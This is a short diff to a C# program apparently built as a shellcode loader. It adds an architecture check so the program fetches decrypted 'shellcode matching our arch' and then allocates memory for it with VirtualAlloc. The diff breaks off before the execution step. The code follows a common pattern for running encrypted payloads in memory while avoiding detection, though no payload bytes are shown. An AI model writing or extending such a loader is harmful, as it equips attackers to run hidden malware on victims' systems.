@@ -11,8 +11,19 @@ namespace CreateThreadExample
     {
         static void Main(string[] args)
         {
-            // Get decrypted pic
-            byte[] pic = GetAllDecryptedBytes();
+            // Determine architecture of executing process
+            string arch;
+            if (IntPtr.Size == 8)
+            {
+                arch = "x64";
+            }
+            else
+            {
+                arch = "x86";
+            }
+
+            // Get decrypted pic for shellcode matching our arch
+            byte[] pic = GetAllDecryptedBytes(arch);
             
             // Allocate space for it
             IntPtr segment = VirtualAlloc(
